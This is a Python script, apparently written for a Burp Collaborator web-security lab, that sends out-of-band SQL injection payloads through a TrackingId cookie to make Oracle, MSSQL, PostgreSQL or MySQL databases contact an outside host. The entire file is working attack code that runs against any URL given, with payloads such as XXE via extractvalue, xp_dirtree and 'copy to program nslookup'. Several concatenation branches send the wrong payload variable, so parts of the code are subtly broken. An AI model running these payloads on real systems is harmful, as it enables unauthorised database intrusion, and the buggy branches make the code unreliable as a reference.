# Lab requires Burp Collaborator
# IRL could set up your own server and adjust payloads accordingly

import requests
import sys
import urllib3
import urllib.parse
import time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Take in a URL and look for OOB interaction

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}

# This works - confirmed from lab
def oracle_check(url,tracking,sid, burp_collaborator):
    print('[+] Oracle DNS check using UNION')
    sqli_payload_union = f"' UNION SELECT extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?>\
        <!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://{burp_collaborator}/\"> %remote;]>'),'/l') FROM dual--"
    sqli_payload_union_encoded = urllib.parse.quote(sqli_payload_union)
    #print(sqli_payload_union_encoded)
    cookies = {'TrackingId': tracking+sqli_payload_union_encoded, 'session': sid}
    #print(cookies)
    r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
    #print(r)

    time.sleep(5)

    print('[+] Oracle DNScheck using concatenation')
    # Payload from Scanner - it uses random characters instead of remote 
    sqli_payload_concat = f"'||(SELECT extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?>\
        <!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://{burp_collaborator}/\"> %remote;]>'),'/l') FROM dual)||'"
    sqli_payload_concat_encoded = urllib.parse.quote(sqli_payload_union)
    #print(sqli_payload_concat_encoded)
    cookies = {'TrackingId': tracking+sqli_payload_concat_encoded, 'session': sid}
    #print(cookies)
    r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
    #print(r)    
    return

# These take the same approach and SHOULD work, but need to be verified with a testing environment.
def ms_check(url,tracking,sid, burp_collaborator):
    # Payload from Burp SQLi cheat sheet - exec master..xp_dirtree '//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a'
    print('[+] Microsoft DNS check using UNION')
    sqli_payload_union = f"' UNION exec master..xp_dirtree '//{burp_collaborator}/a'--"
    sqli_payload_union_encoded = urllib.parse.quote(sqli_payload_union)
    #print(sqli_payload_union_encoded)
    cookies = {'TrackingId': tracking+sqli_payload_union_encoded, 'session': sid}
    #print(cookies)
    r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
    #print(r)

    time.sleep(5)

    print('[+] Microsoft DNS check using concatenation')
    # Payload from Scanner - it uses random characters instead of remote 
    sqli_payload_concat = f"'||(exec master..xp_dirtree '//{burp_collaborator}/a')||'"
    sqli_payload_concat_encoded = urllib.parse.quote(sqli_payload_union)
    #print(sqli_payload_concat_encoded)
    cookies = {'TrackingId': tracking+sqli_payload_concat_encoded, 'session': sid}
    #print(cookies)
    r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
    #print(r)    
    return

def pg_check(url,tracking,sid,burp_collaborator):
    # Payload from Burp SQLi cheat sheet - 	copy (SELECT '') to program 'nslookup YOUR-SUBDOMAIN-HERE.burpcollaborator.net'
    print('[+] PostgreSQL DNS check using UNION')
    sqli_payload_union = f"' UNION 	copy (SELECT '') to program 'nslookup {burp_collaborator}'--"
    sqli_payload_union_encoded = urllib.parse.quote(sqli_payload_union)
    #print(sqli_payload_union_encoded)
    cookies = {'TrackingId': tracking+sqli_payload_union_encoded, 'session': sid}
    #print(cookies)
    r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
    #print(r)

    time.sleep(5)

    print('[+] PostgreSQL DNS check using concatenation')
    # Payload from Scanner - it uses random characters instead of remote 
    sqli_payload_concat = f"'||(copy (SELECT '') to program 'nslookup {burp_collaborator}')||'"
    sqli_payload_concat_encoded = urllib.parse.quote(sqli_payload_union)
    #print(sqli_payload_concat_encoded)
    cookies = {'TrackingId': tracking+sqli_payload_concat_encoded, 'session': sid}
    #print(cookies)
    r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
    #print(r)    
    return

def mysql_check(url,tracking,sid, burp_collaborator):
    # Payload from Burp SQLi cheat sheet - 	LOAD_FILE('\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a') SELECT ... INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a'
    # Portswigger indicates works on Windows only
    print('[+] MySQL DNS check using UNION')
    sqli_payload_union = f"' UNION LOAD_FILE('\\\\\\\\{burp_collaborator}\\\\a')\
        SELECT ... INTO OUTFILE '\\\\\\\\{burp_collaborator}\\a'-- "
    sqli_payload_union_encoded = urllib.parse.quote(sqli_payload_union)
    print(sqli_payload_union_encoded)
    cookies = {'TrackingId': tracking+sqli_payload_union_encoded, 'session': sid}
    #print(cookies)
    r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
    #print(r)

    time.sleep(5)

    print('[+] PostgreSQL check using concatenation')
    # Payload from Scanner - it uses random characters instead of remote 
    sqli_payload_concat = f"'||(LOAD_FILE('\\\\\\\\{burp_collaborator}\\\\a')\
        SELECT ... INTO OUTFILE '\\\\\\\\{burp_collaborator}\\a')||'"
    sqli_payload_concat_encoded = urllib.parse.quote(sqli_payload_union)
    #print(sqli_payload_concat_encoded)
    cookies = {'TrackingId': tracking+sqli_payload_concat_encoded, 'session': sid}
    #print(cookies)
    r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
    #print(r)    
    return

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        tracking = sys.argv[2].strip()
        sid = sys.argv[3].strip()
        burp_collaborator = sys.argv[4].strip()
    except IndexError:
        print(f'[-] Usage: {sys.argv[0]} <url>')
        print(f'[-] Example: {sys.argv[0]} www.example.com TrackingId SessionId subdomain.burpcollaborator.net')
        sys.exit(-1)
    
    print('[+] Check for Oracle lookup')
    oracle_lookup = oracle_check(url, tracking, sid, burp_collaborator)
    oracle_validate = input("[-] Oracle lookup confirmation (y/n)? ")
    if oracle_validate == 'y':
        print('[+] Oracle lookup validated - exiting')
        sys.exit()
    else:
        print('[-] Oracle lookup failed - attempting other database types')
    
    print('[+] Check for MS lookup')
    ms_lookup = ms_check(url, tracking, sid, burp_collaborator)
    ms_validate = input("[-] Microsoft lookup confirmation (y/n)? ")
    if ms_validate == 'y':
        print('[+] Microsoft lookup validated - exiting')
        sys.exit()
    else:
        print('[-] Microsoft lookup failed - attempting other database types')
    
    print('[+] Check for PostgreSQL lookup')
    pg_lookup = pg_check(url, tracking, sid, burp_collaborator)
    pg_validate = input("[-] PostgreSQL lookup confirmation (y/n)? ")
    if pg_validate == 'y':
        print('[+] PostgreSQL lookup validated - exiting')
        sys.exit()
    else:
        print('[-] PostgreSQL lookup failed - attempting other database types')
    
    print('[+] Check for MySQL lookup')
    mysql_lookup = mysql_check(url, tracking, sid, burp_collaborator)
    mysql_validate = input("[-] MySQL lookup confirmation (y/n)? ")
    if mysql_validate == 'y':
        print('[+] MySQL lookup validated - exiting')
        sys.exit()
    else:
        print('[-] MySQL lookup failed - end of OOB interaction attempts.')
